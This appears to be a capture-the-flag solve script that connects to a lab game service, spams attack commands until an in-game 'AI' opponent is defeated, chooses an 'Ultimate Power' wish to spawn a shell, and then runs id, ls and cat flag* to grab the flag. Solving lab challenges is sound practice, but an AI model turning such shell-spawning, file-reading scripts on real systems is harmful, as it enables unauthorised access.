#!/usr/bin/env python3
import socket
import time
import sys

HOST = sys.argv[1] if len(sys.argv) >= 2 else "192.168.100.121"
PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 40021

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

data = s.recv(4096)
print(f"[+] Connected: {data[:50].decode()}...")

s.sendall(b"Hacker\n")
print("[+] Name sent")

time.sleep(0.2)
data = s.recv(4096)
print(f"[+] Welcome message:\n{data.decode('utf-8', errors='ignore')}")

for attack_num in range(1, 30):
    s.sendall(b"1\n")
    time.sleep(0.3)

    data = s.recv(4096)
    text = data.decode("utf-8", errors="ignore")

    print(f"[Turn {attack_num}] {text[:80]}...")

    if "defeated" in text.lower() or "wish" in text.lower() or "grant" in text.lower():
        print(f"\n[SUCCESS] AI defeated after {attack_num} attacks!")
        print("=" * 70)
        print(text)
        print("=" * 70)
        break

    if "fallen" in text.lower() or "game over" in text.lower():
        print(f"\n[FAIL] We died!")
        print(text)
        sys.exit(1)

print("\n[*] Waiting for wish menu...")
time.sleep(0.5)
wish_data = s.recv(4096)
print("=" * 70)
print(wish_data.decode("utf-8", errors="ignore"))
print("=" * 70)

print("[*] Choosing option 2 (Ultimate Power)")
s.sendall(b"2\n")

time.sleep(1)
result = s.recv(4096)
print("=" * 70)
print(result.decode("utf-8", errors="ignore"))
print("=" * 70)

if b"sh" in result or b"debug" in result.lower() or b"$" in result:
    print("\n[SUCCESS] Shell spawned! Entering interactive mode...")
    s.sendall(b"id\n")
    time.sleep(0.5)
    print(s.recv(4096).decode("utf-8", errors="ignore"))

    s.sendall(b"ls -la\n")
    time.sleep(0.5)
    print(s.recv(4096).decode("utf-8", errors="ignore"))

    s.sendall(b"cat flag*\n")
    time.sleep(0.5)
    flag_data = s.recv(4096)
    print(flag_data.decode("utf-8", errors="ignore"))

    if b"flag{" in flag_data or b"CSC{" in flag_data:
        print("\n[FLAG CAPTURED]")
else:
    print("\n[WARN] No shell detected")

s.close()
